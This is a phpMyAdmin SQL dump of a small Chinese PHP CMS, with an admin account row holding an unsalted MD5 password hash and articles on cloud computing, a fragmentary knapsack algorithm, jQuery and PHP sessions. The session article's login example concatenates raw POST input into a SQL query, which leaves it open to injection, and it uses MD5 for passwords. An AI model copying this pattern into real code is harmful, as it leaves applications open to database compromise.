-- phpMyAdmin SQL Dump
-- version 3.3.9
-- http://www.phpmyadmin.net
--
-- 主机: localhost
-- 生成日期: 2011 年 11 月 16 日 10:18
-- 服务器版本: 5.5.8
-- PHP 版本: 5.3.5

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `cp2`
--

-- --------------------------------------------------------

--
-- 表的结构 `cp_admin`
--

CREATE TABLE IF NOT EXISTS `cp_admin` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '用户id',
  `groupid` tinyint(4) NOT NULL DEFAULT '1' COMMENT '用户组ID',
  `username` varchar(20) NOT NULL COMMENT '用户名',
  `password` varchar(32) NOT NULL COMMENT '密码',
  `login_time` int(10) unsigned NOT NULL COMMENT '登录时间',
  `login_ip` varchar(15) NOT NULL COMMENT '登录ip',
  `lock` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '锁定状态',
  PRIMARY KEY (`id`),
  UNIQUE KEY `usename` (`username`),
  KEY `groupid` (`groupid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='管理员信息表' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `cp_admin`
--

INSERT INTO `cp_admin` (`id`, `groupid`, `username`, `password`, `login_time`, `login_ip`, `lock`) VALUES
(1, 1, 'admin', 'cd9465168b73689fd2f3775ddcdbf7a4', 1321425154, '127.0.0.1', 0);

-- --------------------------------------------------------

--
-- 表的结构 `cp_article`
--

CREATE TABLE IF NOT EXISTS `cp_article` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '文章id',
  `cat_id` int(10) unsigned NOT NULL COMMENT '分类id',
  `title` varchar(255) NOT NULL COMMENT '文章标题',
  `keywords` varchar(255) DEFAULT NULL COMMENT '关键词',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `content` text NOT NULL COMMENT '内容',
  `views` int(11) unsigned NOT NULL DEFAULT '1' COMMENT '浏览量',
  `status` tinyint(4) NOT NULL DEFAULT '1' COMMENT '状态',
  `top` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '置顶',
  `recommend` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '推荐',
  `create_time` int(10) unsigned NOT NULL COMMENT '创建时间',
  `create_uid` int(10) unsigned NOT NULL COMMENT '创建者uid',
  `create_username` varchar(20) NOT NULL COMMENT '创建者用户名',
  PRIMARY KEY (`id`),
  KEY `title` (`title`),
  KEY `views` (`views`),
  KEY `create_time` (`create_time`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章信息表' AUTO_INCREMENT=128 ;

--
-- 转存表中的数据 `cp_article`
--

INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(1, 1, 'cp框架1.0版本正式发布', 'cp框架1.0版本正式发布', 'cp框架1.0版本正式发布', 'cp框架1.0版本正式发布', 1, 1, 0, 0, 1297351993, 1, 'admin'),
(2, 1, '不同层次的云计算：SaaS、PaaS和IaaS', '云计算', '', '&lt;p align=&quot;left&quot;&gt;云计算包含三种不同服务类型：SaaS、PaaS和IaaS：&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;软件即服务(SoftwareasaService，SaaS)&lt;/strong&gt;指的是通过浏览器，以服务形式提供给用户应用程序。有些是由公有云提供商提供的商用SaaS应用，有的则是企业私有云上提供的商用及订制的SaaS应用。甲骨文是SaaS提供商，可提供众多的SaaS应用软件，以及托管与被管理的应用软件。甲骨文把这些产品称为OracleonDemand。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;平台即服务(PlatformasaService，PaaS)&lt;/strong&gt;指的是以服务形式提供给开发人员应用程序开发及部署平台，让他们可利用此平台来开发、部署和管理SaaS应用程序。这种平台一般包含数据库、中间件及开发工具，所有都以服务形式通过互联网提供。这类基础架构软件的基础通常是虚拟化和集群化的网格计算(GridComputing)架构。甲骨文并非PaaS提供商，而是协助实现PaaS，提供技术给PaaS和SaaS提供商，使他们能建立自己的服务。甲骨文称这些技术为OracleSaaS平台(OraclePlatformforSaaS)。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;基础架构即服务(InfrastructureasaService，IaaS)&lt;/strong&gt;指的是以服务形式提供服务器、存储和网络硬件。这类基础架构一般是利用网格计算(GridComputing)架构建立虚拟化的环境，因此虚拟化、集群和动态配置软件也被涵盖在IaaS之中。甲骨文也不是IaaS提供商，但甲骨文和亚马逊网络服务(AmazonWebServices)等IaaS提供商合作，来为企业选择在他们自己的私有云或者公有云上部署甲骨文技术，提供更多灵活性。&lt;br /&gt;\r\n&lt;br /&gt;\r\n向云演进&lt;br /&gt;\r\n向云模式转变时，要铭记几件事，包括特定云的特性，还有规划和文化问题，这些问题可能成为采用未来架构的障碍。&lt;br /&gt;\r\n企业要有一个架构框架，对于评估和设计一个能够实现当前和未来业务目标的云基础设施很重要。这样一个框架将帮助设计师明确架构愿景、分析系统和技术架构的设计，以及将迁移规划、治理和变化管理纳入总的计划中。&lt;br /&gt;\r\n&lt;br /&gt;\r\n甲骨文的云计算策略&lt;br /&gt;\r\n甲骨文的云计算有两个目标：第一个目标是确保云计算完全达到企业级，以便企业能安心采用。企业级意味着具备高效能、可扩展性、可用性及安全性，并且确保可移植性、兼容性，且不会绑定在特定厂商平台上。第二个目标是既支持公有云计算又支持私有云计算——客户有选择余地。&lt;br /&gt;\r\n&lt;br /&gt;\r\n为满足这些目标，甲骨文有三项策略：&lt;br /&gt;\r\n1、为客户提供越来越多的应用软件作为SaaS服务；&lt;br /&gt;\r\n2、为其他云提供商提供技术；&lt;br /&gt;\r\n3、让客户能选择将甲骨文的技术部署在私有云或是公有云上。&lt;br /&gt;\r\n甲骨文云产品非常丰富，包含提供SaaS的OnDemand应用，以及托管和被管理的方案等等内部部署(on-premise)以外的选择。&lt;br /&gt;\r\n针对SaaS独立软件开发商(ISV)及企业内的开发人员，甲骨文也提供OracleSaaS平台(OraclePlatformforSaaS)来部署SaaS产品或私有云。网格运算（GridComputing）是OracleSaaS平台的基础，为客户的公有云和私有云提供具成本效益、高扩展性且高可用性的软件基础架构。&lt;br /&gt;\r\n甲骨文还可协助企业在公有云上部署甲骨文技术。2008年9月甲骨文推出可让企业享受到云计算发展的好处：和亚马逊网络服务(AmazonWebServices，AWS)合作推出以下产品和服务，包括在云中部署甲骨文软件、在云中备份甲骨文数据库。此外甲骨文还推出一组免费的AmazonMachineImages(AMI)，使客户可以很轻易开始在AmazonEC2(AmazonElasticComputeCloud)上部署甲骨文解决方案', 1, 1, 0, 0, 1301321002, 1, 'admin'),
(3, 1, '背包问题的PHP算法', '', '', '$b[3]) ? -1 : 1; } return $returnvalue; } //按单位最大价值排序 usort($arywp, “cmp”); print_r($arywp); echo ” &lt;br /&gt;\r\nn”; //递归函数，计算剩余空间的允许物品最大价值 function getmaxval($bbw,$arywp){ //最大单位物品的重量、价值、数量 $use_w=0; $use_v=0; $ary_userwp=array(); //当前空间的允许物品最大价值 $maxwgt=0; $maxval=0; $maxuserwp=array(); $wp = array_shift($arywp); $num= floor(($bbw-$use_w)/$wp[1]); //最大单位物品的最大允许个数 //echo ” countmax : $num * “.$wp[0].”&lt;br /&gt;\r\nn”; if(count($arywp)==0 || $bbw-$use_w==$wp[1]*$num){ //没有剩余物品或刚好填满 //递归结束条件 if($num&amp;gt;0){ $maxwgt+=$wp[1]*$num; $maxval+=$wp[2]*$num; $maxuserwp[$wp[0]]=$num; } } else { for($i=0;$i&amp;lt;=$num;$i++){ //计算最大单位物品不同数量时的最大价值 $use_w=$wp[1]*$i; $use_v=$wp[2]*$i; $ary_userwp[$wp[0]]=$i; if(($num-$i)*$wp[2]/($bbw-$use_w) &amp;lt; $arywp[0][3]){ //剩余空间的单位价值小于下件物品的单位价值 list($subuse_w,$subuse_v,$subusewp)=getmaxval($bbw-$use_w,$arywp); } else { $subuse_w=0; $subuse_v=0; $subusewp=array(); } if($use_v+$subuse_v&amp;gt;$maxval || $maxval==0){ //比较最大价值 $maxwgt=$use_w+$subuse_w; $maxval=$use_v+$subuse_v; if($i&amp;gt;0){ $maxuserwp=array_merge($ary_userwp,$subusewp); } else{ $maxuserwp=$subusewp; } } } //print_r($maxuserwp); //echo ” maxwgt : $maxwgt maxval : $maxval&lt;br /&gt;\r\nn”; } //返回 使用的重量，最大价值、使用的物品数量数组 return array($maxwgt,$maxval, $maxuserwp); } //开始计算 $arysulte= getmaxval($bbw,$arywp); //输出结果 echo ” bbw “.$bbw.” “; print_r($arysulte); $time_end = microtime_float(); $runtime = $time_end – $time_start; echo ” runtime : “.$runtime; ?&amp;gt; ', 1, 1, 0, 0, 1301375688, 1, 'admin'),
(4, 1, 'jQuery技巧总结', '', '', '&lt;div class=&quot;f14 mb10&quot; id=&quot;read_tpc&quot;&gt;一、简介 &lt;br /&gt;\r\n1.1、概述 &lt;br /&gt;\r\n随着WEB2.0及ajax思想在互联网上的快速发展传播，陆续出现了一些优秀的Js框架，其中比较著名的有Prototype、YUI、jQuery、mootools、Bindows以及国内的JSVM框架等，通过将这些JS框架应用到我们的项目中能够使程序员从设计和书写繁杂的JS应用中解脱出来，将关注点转向功能需求而非实现细节上，从而提高项目的开发速度。 &lt;br /&gt;\r\njQuery是继prototype之后的又一个优秀的Javascript框架。它是由 John Resig 于 2006 年初创建的，它有助于简化 JavaScript™ 以及Ajax 编程。有人使用这样的一比喻来比较prototype和jQuery：prototype就像Java，而jQuery就像ruby. 它是一个简洁快速灵活的JavaScript框架，它能让你在你的网页上简单的操作文档、处理事件、实现特效并为Web页面添加Ajax交互。 &lt;br /&gt;\r\n它具有如下一些特点： &lt;br /&gt;\r\n1、代码简练、语义易懂、学习快速、文档丰富。 &lt;br /&gt;\r\n2、jQuery是一个轻量级的脚本，其代码非常小巧，最新版的JavaScript包只有20K左右。 &lt;br /&gt;\r\n3、jQuery支持CSS1-CSS3,以及基本的xPath。 &lt;br /&gt;\r\n4、jQuery是跨浏览器的，它支持的浏览器包括IE 6.0+, FF 1.5+, Safari 2.0+, Opera 9.0+。 &lt;br /&gt;\r\n5、可以很容易的为jQuery扩展其他功能。 &lt;br /&gt;\r\n6、能将JS代码和HTML代码完全分离，便于代码和维护和修改。 &lt;br /&gt;\r\n7、插件丰富，除了jQuery本身带有的一些特效外，可以通过插件实现更多功能，如表单验证、tab导航、拖放效果、表格排序、DataGrid，树形菜单、图像特效以及ajax上传等。 &lt;br /&gt;\r\njQuery的设计会改变你写JavaScript代码的方式，降低你学习使用JS操作网页的复杂度，提高网页JS开发效率，无论对于js初学者还是资深专家，jQuery都将是您的首选。 &lt;br /&gt;\r\njQuery适合于设计师、开发者以及那些还好者，同样适合用于商业开发，可以说jQuery适合任何JavaScript应用的地方，可用于不同的Web应用程序中。 &lt;br /&gt;\r\n官方站点：&lt;a id=&quot;url_1&quot; onclick=&quot;return checkUrl(this)&quot; href=&quot;http://jquery.com/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0070af&quot;&gt;http://jquery.com/&lt;/font&gt;&lt;/a&gt; 中文站点：&lt;a id=&quot;url_2&quot; onclick=&quot;return checkUrl(this)&quot; href=&quot;http://jquery.org.cn/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0070af&quot;&gt;http://jquery.org.cn/&lt;/font&gt;&lt;/a&gt; &lt;br /&gt;\r\n1.2、目的 &lt;br /&gt;\r\n通过学习本文档，能够对jQuery有一个简单的认识了解，清楚JQuery与其他JS框架的不同，掌握jQuery的常用语法、使用技巧及注意事项。 &lt;br /&gt;\r\n二、使用方法 &lt;br /&gt;\r\n在需要使用JQuery的页面中引入JQuery的js文件即可。 &lt;br /&gt;\r\n例如： &lt;br /&gt;\r\n引入之后便可在页面的任意地方使用jQuery提供的语法。 &lt;br /&gt;\r\n三、学习教程及参考资料 &lt;br /&gt;\r\n请参照《jQuery中文API手册》和&lt;a id=&quot;url_3&quot; onclick=&quot;return checkUrl(this)&quot; href=&quot;http://jquery.org.cn/visual/cn/index.xml&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0070af&quot;&gt;http://jquery.org.cn/visual/cn/index.xml&lt;/font&gt;&lt;/a&gt; &lt;br /&gt;\r\n推荐两篇不错的jquery教程：《jQuery的起点教程》和《使用 jQuery 简化 Ajax 开发》 &lt;br /&gt;\r\n(说明：以上文档都放在了【附件】中) &lt;br /&gt;\r\n四、语法总结和注意事项 &lt;br /&gt;\r\n1、关于页面元素的引用 &lt;br /&gt;\r\n通过jquery的$()引用元素包括通过id、class、元素名以及元素的层级关系及dom或者xpath条件等方法，且返回的对象为jquery对象（集合对象），不能直接调用dom定义的方法。 &lt;br /&gt;\r\n2、jQuery对象与dom对象的转换 &lt;br /&gt;\r\n只有jquery对象才能使用jquery定义的方法。注意dom对象和jquery对象是有区别的，调用方法时要注意操作的是dom对象还是jquery对象。 &lt;br /&gt;\r\n普通的dom对象一般可以通过$()转换成jquery对象。 &lt;br /&gt;\r\n如：$(document.getElementById(&quot;msg&quot;))则为jquery对象，可以使用jquery的方法。 &lt;br /&gt;\r\n由于jquery对象本身是一个集合。所以如果jquery对象要转换为dom对象则必须取出其中的某一项，一般可通过索引取出。 &lt;br /&gt;\r\n如：$(&quot;#msg&quot;)[0]，$(&quot;div&quot;).eq(1)[0]，$(&quot;div&quot;).get()[1]，$(&quot;td&quot;)[5]这些都是dom对象，可以使用dom中的方法，但不能再使用Jquery的方法。 &lt;br /&gt;\r\n以下几种写法都是正确的： &lt;br /&gt;\r\n$(&quot;#msg&quot;).html(); &lt;br /&gt;\r\n$(&quot;#msg&quot;)[0].innerHTML; &lt;br /&gt;\r\n$(&quot;#msg&quot;).eq(0)[0].innerHTML; &lt;br /&gt;\r\n$(&quot;#msg&quot;).get(0).innerHTML; &lt;br /&gt;\r\n3、如何获取jQuery集合的某一项 &lt;br /&gt;\r\n对于获取的元素集合，获取其中的某一项（通过索引指定）可以使用eq或get(n)方法或者索引号获取，要注意，eq返回的是jquery对象，而get(n)和索引返回的是dom元素对象。对于jquery对象只能使用jquery的方法，而dom对象只能使用dom的方法，如要获取第三个 &lt;div&gt;元素的内容。有如下两种方法： &lt;br /&gt;\r\n$(&quot;div&quot;).eq(2).html(); //调用jquery对象的方法 &lt;br /&gt;\r\n$(&quot;div&quot;).get(2).innerHTML; //调用dom的方法属性 &lt;br /&gt;\r\n4、同一函数实现set和get &lt;br /&gt;\r\nJquery中的很多方法都是如此，主要包括如下几个： &lt;br /&gt;\r\n$(&quot;#msg&quot;).html(); //返回id为msg的元素节点的html内容。 &lt;br /&gt;\r\n$(&quot;#msg&quot;).html(&quot;&lt;b&gt;new content&lt;/b&gt;&quot;); &lt;br /&gt;\r\n//将“&lt;b&gt;new content&lt;/b&gt;” 作为html串写入id为msg的元素节点内容中,页面显示粗体的new content &lt;br /&gt;\r\n$(&quot;#msg&quot;).text(); //返回id为msg的元素节点的文本内容。 &lt;br /&gt;\r\n$(&quot;#msg&quot;).text(&quot;&lt;b&gt;new content&lt;/b&gt;&quot;); &lt;br /&gt;\r\n//将“&lt;b&gt;new content&lt;/b&gt;” 作为普通文本串写入id为msg的元素节点内容中,页面显示&lt;b&gt;new content&lt;/b&gt; &lt;br /&gt;\r\n$(&quot;#msg&quot;).height(); //返回id为msg的元素的高度 &lt;br /&gt;\r\n$(&quot;#msg&quot;).height(&quot;300&quot;); //将id为msg的元素的高度设为300 &lt;br /&gt;\r\n$(&quot;#msg&quot;).width(); //返回id为msg的元素的宽度 &lt;br /&gt;\r\n$(&quot;#msg&quot;).width(&quot;300&quot;); //将id为msg的元素的宽度设为300 &lt;br /&gt;\r\n$(&quot;input&quot;).val(&quot;); //返回表单输入框的value值 &lt;br /&gt;\r\n$(&quot;input&quot;).val(&quot;test&quot;); //将表单输入框的value值设为test &lt;br /&gt;\r\n$(&quot;#msg&quot;).click(); //触发id为msg的元素的单击事件 &lt;br /&gt;\r\n$(&quot;#msg&quot;).click(fn); //为id为msg的元素单击事件添加函数 &lt;br /&gt;\r\n同样blur,focus,select,submit事件都可以有着两种调用方法 &lt;br /&gt;\r\n5、集合处理功能 &lt;br /&gt;\r\n对于jquery返回的集合内容无需我们自己循环遍历并对每个对象分别做处理，jquery已经为我们提供的很方便的方法进行集合的处理。 &lt;br /&gt;\r\n包括两种形式： &lt;br /&gt;\r\n$(&quot;p&quot;).each(function(i){this.style.color=[''#f00'',''#0f0'',''#00f'']}) &lt;br /&gt;\r\n//为索引分别为0，1，2的p元素分别设定不同的字体颜色。 &lt;br /&gt;\r\n$(&quot;tr&quot;).each(function(i){this.style.backgroundColor=[''#ccc'',''#fff''][i%2]}) &lt;br /&gt;\r\n//实现表格的隔行换色效果 &lt;br /&gt;\r\n$(&quot;p&quot;).click(function(){alert($(this).html())}) &lt;br /&gt;\r\n//为每个p元素增加了click事件，单击某个p元素则弹出其内容 &lt;br /&gt;\r\n6、扩展我们需要的功能 &lt;br /&gt;\r\n$.extend({ &lt;br /&gt;\r\nmin: function(a, b){return a &amp;lt; b?a:b; }, &lt;br /&gt;\r\nmax: function(a, b){return a &amp;gt; b?a:b; } &lt;br /&gt;\r\n}); //为jquery扩展了min,max两个方法 &lt;br /&gt;\r\n使用扩展的方法（通过“$.方法名”调用）： &lt;br /&gt;\r\nalert(&quot;a=10,b=20,max=&quot;+$.max(10,20)+&quot;,min=&quot;+$.min(10,20)); &lt;br /&gt;\r\n7、支持方法的连写 &lt;br /&gt;\r\n所谓连写，即可以对一个jquery对象连续调用各种不同的方法。 &lt;br /&gt;\r\n例如： &lt;br /&gt;\r\n$(&quot;p&quot;).click(function(){alert($(this).html())}) &lt;br /&gt;\r\n.mouseover(function(){alert(''mouse over event'')}) &lt;br /&gt;\r\n.each(function(i){this.style.color=[''#f00'',''#0f0'',''#00f'']}); &lt;br /&gt;\r\n8、操作元素的样式 &lt;br /&gt;\r\n主要包括以下几种方式： &lt;br /&gt;\r\n$(&quot;#msg&quot;).css(&quot;background&quot;); //返回元素的背景颜色 &lt;br /&gt;\r\n$(&quot;#msg&quot;).css(&quot;background&quot;,&quot;#ccc&quot;) //设定元素背景为灰色 &lt;br /&gt;\r\n$(&quot;#msg&quot;).height(300); $(&quot;#msg&quot;).width(&quot;200&quot;); //设定宽高 &lt;br /&gt;\r\n$(&quot;#msg&quot;).css({ color: &quot;red&quot;, background: &quot;blue&quot; });//以名值对的形式设定样式 &lt;br /&gt;\r\n$(&quot;#msg&quot;).addClass(&quot;select&quot;); //为元素增加名称为select的class &lt;br /&gt;\r\n$(&quot;#msg&quot;).removeClass(&quot;select&quot;); //删除元素名称为select的class &lt;br /&gt;\r\n$(&quot;#msg&quot;).toggleClass(&quot;select&quot;); //如果存在（不存在）就删除（添加）名称为select的class &lt;br /&gt;\r\n&lt;div class=&quot;f14 mb10&quot; id=&quot;read_81010&quot;&gt;9、完善的事件处理功能 &lt;br /&gt;\r\nJquery已经为我们提供了各种事件处理方法，我们无需在html元素上直接写事件，而可以直接为通过jquery获取的对象添加事件。 &lt;br /&gt;\r\n如： &lt;br /&gt;\r\n$(&quot;#msg&quot;).click(function(){alert(&quot;good&quot;)}) //为元素添加了单击事件 &lt;br /&gt;\r\n$(&quot;p&quot;).click(function(i){this.style.color=[''#f00'',''#0f0'',''#00f'']}) &lt;br /&gt;\r\n//为三个不同的p元素单击事件分别设定不同的处理 &lt;br /&gt;\r\njQuery中几个自定义的事件： &lt;br /&gt;\r\n（1）hover(fn1,fn2)：一个模仿悬停事件（鼠标移动到一个对象上面及移出这个对象）的方法。当鼠标移动到一个匹配的元素上面时，会触发指定的第一个函数。当鼠标移出这个元素时，会触发指定的第二个函数。 &lt;br /&gt;\r\n//当鼠标放在表格的某行上时将class置为over，离开时置为out。 &lt;br /&gt;\r\n$(&quot;tr&quot;).hover(function(){ &lt;br /&gt;\r\n$(this).addClass(&quot;over&quot;); &lt;br /&gt;\r\n}, &lt;br /&gt;\r\nfunction(){ &lt;br /&gt;\r\n$(this).addClass(&quot;out&quot;); &lt;br /&gt;\r\n}); &lt;br /&gt;\r\n（2）ready(fn):当DOM载入就绪可以查询及操纵时绑定一个要执行的函数。 &lt;br /&gt;\r\n$(document).ready(function(){alert(&quot;Load Success&quot;)}) &lt;br /&gt;\r\n//页面加载完毕提示“Load Success”,不同于onload事件，onload需要页面内容加载完毕（图片等），而ready只要页面html代码下载完毕即触发。与$(fn)等价 &lt;br /&gt;\r\n（3）toggle(evenFn,oddFn): 每次点击时切换要调用的函数。如果点击了一个匹配的元素，则触发指定的第一个函数，当再次点击同一元素时，则触发指定的第二个函数。随后的每次点击都重复对这两个函数的轮番调用。 &lt;br /&gt;\r\n//每次点击时轮换添加和删除名为selected的class。 &lt;br /&gt;\r\n$(&quot;p&quot;).toggle(function(){ &lt;br /&gt;\r\n$(this).addClass(&quot;selected&quot;); &lt;br /&gt;\r\n},function(){ &lt;br /&gt;\r\n$(this).removeClass(&quot;selected&quot;); &lt;br /&gt;\r\n}); &lt;br /&gt;\r\n（4）trigger(eventtype): 在每一个匹配的元素上触发某类事件。 &lt;br /&gt;\r\n例如： &lt;br /&gt;\r\n$(&quot;p&quot;).trigger(&quot;click&quot;); //触发所有p元素的click事件 &lt;br /&gt;\r\n（5）bind(eventtype,fn)，unbind(eventtype): 事件的绑定与反绑定 &lt;br /&gt;\r\n从每一个匹配的元素中（添加）删除绑定的事件。 &lt;br /&gt;\r\n例如： &lt;br /&gt;\r\n$(&quot;p&quot;).bind(&quot;click&quot;, function(){alert($(this).text());}); //为每个p元素添加单击事件 &lt;br /&gt;\r\n$(&quot;p&quot;).unbind(); //删除所有p元素上的所有事件 &lt;br /&gt;\r\n$(&quot;p&quot;).unbind(&quot;click&quot;) //删除所有p元素上的单击事件 &lt;br /&gt;\r\n10、几个实用特效功能 &lt;br /&gt;\r\n其中toggle()和slidetoggle()方法提供了状态切换功能。 &lt;br /&gt;\r\n如toggle()方法包括了hide()和show()方法。 &lt;br /&gt;\r\nslideToggle()方法包括了slideDown()和slideUp方法。 &lt;br /&gt;\r\n11、几个有用的jQuery方法 &lt;br /&gt;\r\n$.browser.浏览器类型：检测浏览器类型。有效参数：safari, opera, msie, mozilla。如检测是否ie：$.browser.isie，是ie浏览器则返回true。 &lt;br /&gt;\r\n$.each(obj, fn)：通用的迭代函数。可用于近似地迭代对象和数组（代替循环）。 &lt;br /&gt;\r\n如 &lt;br /&gt;\r\n$.each( [0,1,2], function(i, n){ alert( &quot;Item #&quot; + i + &quot;: &quot; + n ); }); &lt;br /&gt;\r\n等价于： &lt;br /&gt;\r\nvar tempArr=[0,1,2]; &lt;br /&gt;\r\nfor(var i=0;i&lt;temparr .LENGTH;I++){ &lt;br/&gt; alert(&quot;Item #&quot;+i+&quot;: &quot;+tempArr); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n也可以处理json数据，如 &lt;br /&gt;\r\n$.each( { name: &quot;John&quot;, lang: &quot;JS&quot; }, function(i, n){ alert( &quot;Name: &quot; + i + &quot;, Value: &quot; + n ); }); &lt;br /&gt;\r\n结果为： &lt;br /&gt;\r\nName:name, Value:John &lt;br /&gt;\r\nName:lang, Value:JS &lt;br /&gt;\r\n$.extend(target,prop1,propN)：用一个或多个其他对象来扩展一个对象，返回这个被扩展的对象。这是jquery实现的继承方式。 &lt;br /&gt;\r\n如： &lt;br /&gt;\r\n$.extend(settings, options); &lt;br /&gt;\r\n//合并settings和options，并将合并结果返回settings中，相当于options继承setting并将继承结果保存在setting中。 &lt;br /&gt;\r\nvar settings = $.extend({}, defaults, options); &lt;br /&gt;\r\n//合并defaults和options，并将合并结果返回到setting中而不覆盖default内容。 &lt;br /&gt;\r\n可以有多个参数（合并多项并返回） &lt;br /&gt;\r\n$.map(array, fn)：数组映射。把一个数组中的项目(处理转换后)保存到到另一个新数组中，并返回生成的新数组。 &lt;br /&gt;\r\n如： &lt;br /&gt;\r\nvar tempArr=$.map( [0,1,2], function(i){ return i + 4; }); &lt;br /&gt;\r\ntempArr内容为：[4,5,6] &lt;br /&gt;\r\nvar tempArr=$.map( [0,1,2], function(i){ return i &amp;gt; 0 ? i + 1 : null; }); &lt;br /&gt;\r\ntempArr内容为：[2,3] &lt;br /&gt;\r\n$.merge(arr1,arr2):合并两个数组并删除其中重复的项目。 &lt;br /&gt;\r\n如：$.merge( [0,1,2], [2,3,4] ) //返回[0,1,2,3,4] &lt;br /&gt;\r\n$.trim(str)：删除字符串两端的空白字符。 &lt;br /&gt;\r\n如：$.trim(&quot; hello, how are you? &quot;); //返回&quot;hello,how are you? &quot; &lt;br /&gt;\r\n12、解决自定义方法或其他类库与jQuery的冲突 &lt;br /&gt;\r\n很多时候我们自己定义了$(id)方法来获取一个元素，或者其他的一些js类库如prototype也都定义了$方法，如果同时把这些内容放在一起就会引起变量方法定义冲突，Jquery对此专门提供了方法用于解决此问题。 &lt;br /&gt;\r\n使用jquery中的jQuery.noConflict();方法即可把变量$的控制权让渡给第一个实现它的那个库或之前自定义的$方法。之后应用Jquery的时候只要将所有的$换成jQuery即可，如原来引用对象方法$(&quot;#msg&quot;)改为jQuery(&quot;#msg&quot;)。 &lt;br /&gt;\r\n如： &lt;br /&gt;\r\njQuery.noConflict(); &lt;br /&gt;\r\n// 开始使用jQuery &lt;br /&gt;\r\njQuery(&quot;div p&quot;).hide(); &lt;br /&gt;\r\n// 使用其他库的 $() &lt;br /&gt;\r\n$(&quot;content&quot;).style.display = ''none''; &lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!--content_read--&gt;', 1, 1, 0, 0, 1301375830, 1, 'admin'),
(5, 1, 'PHP会话(Session)详细介绍', '', '', '对于 Cookie 来说，假设我们要验证用户是否登陆，就必须在 Cookie 中保存用户名和密码（可能是 md5 加密后字符串），并在每次请求页面的时候进行验证。如果用户名和密码存储在数据库，每次都要执行一次数据库查询，给数据库造成多余的负担。因为我们并不能只做一次验证。为什么呢？因为客户端 Cookie 中的信息是有可能被修改的。假如你存储 $admin 变量来表示用户是否登陆，$admin 为 true 的时候表示登陆，为 false 的时候表示未登录，在第一次通过验证后将 $admin 等于 true 存储在 Cookie，下次就不用验证了，这样对么？错了，假如有人伪造一个值为 true 的 $admin 变量那不是就立即取的了管理权限么？非常的不安全。 &lt;br /&gt;\r\n　　而 Session 就不同了，Session 是存储在服务器端的，远程用户没办法修改 Session 文件的内容，因此我们可以单纯存储一个 $admin 变量来判断是否登陆，首次验证通过后设置 $admin 值为 true，以后判断该值是否为 true，假如不是，转入登陆界面，这样就可以减少很多数据库操作了。而且可以减少每次为了验证 Cookie 而传递密码的不安全性了（Session 验证只需要传递一次，假如你没有使用 SSL 安全协议的话）。即使密码进行了 md5 加密，也是很容易被截获的。 &lt;br /&gt;\r\n　　使用 Session 还有很多优点，比如控制容易，可以按照用户自定义存储等（存储于数据库）。我这里就不多说了。 &lt;br /&gt;\r\n　　开始介绍如何创建 Session。非常简单，真的。 &lt;br /&gt;\r\n　　启动 Session 会话，并创建一个 $admin 变量： &lt;br /&gt;\r\n&lt;br /&gt;\r\nview plaincopy to clipboardprint? &lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n// 启动 Session &lt;br /&gt;\r\nsession_start(); &lt;br /&gt;\r\n// 声明一个名为 admin 的变量，并赋空值。 &lt;br /&gt;\r\n$_SESSION[\\&quot;admin\\&quot;] = null; &lt;br /&gt;\r\n?&amp;gt; &lt;br /&gt;\r\n&lt;br /&gt;\r\n　　如果你使用了 Seesion，或者该 PHP 文件要调用 Session 变量，那么就必须在调用 Session 之前启动它，使用 session_start() 函数。其它都不需要你设置了，PHP 自动完成 Session 文件的创建。 &lt;br /&gt;\r\n　　执行完这个程序后，我们可以到系统临时文件夹找到这个 Session 文件，一般文件名形如：sess_4c83638b3b0dbf65583181c2f89168ec，后面是 32 位编码后的随机字符串。用编辑器打开它，看一下它的内容： &lt;br /&gt;\r\n&lt;br /&gt;\r\nadmin|N; &lt;br /&gt;\r\nadmin|N; &lt;br /&gt;\r\n　　一般该内容是这样的结构： &lt;br /&gt;\r\n&lt;br /&gt;\r\n变量名|类型:长度:值; &lt;br /&gt;\r\n&lt;br /&gt;\r\n变量名|类型:长度:值; &lt;br /&gt;\r\n　　并用分号隔开每个变量。有些是可以省略的，比如长度和类型。 &lt;br /&gt;\r\n　　我们来看一下验证程序，假设数据库存储的是用户名和 md5 加密后的密码： &lt;br /&gt;\r\nlogin.php &lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n// 表单提交后... &lt;br /&gt;\r\n$posts = $_POST; &lt;br /&gt;\r\n// 清除一些空白符号 &lt;br /&gt;\r\nforeach ($posts as $key =&amp;gt; $value) { &lt;br /&gt;\r\n$posts[$key] = trim($value); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n$password = md5($posts[\\&quot;password\\&quot;]); &lt;br /&gt;\r\n$username = $posts[\\&quot;username\\&quot;]; &lt;br /&gt;\r\n&lt;br /&gt;\r\n$query = \\&quot;SELECT `username` FROM `user` WHERE `password` = ''$password'' AND `username` = ''$username''\\&quot;; &lt;br /&gt;\r\n// 取得查询结果 &lt;br /&gt;\r\n$userInfo = $DB-&amp;gt;getRow($query); 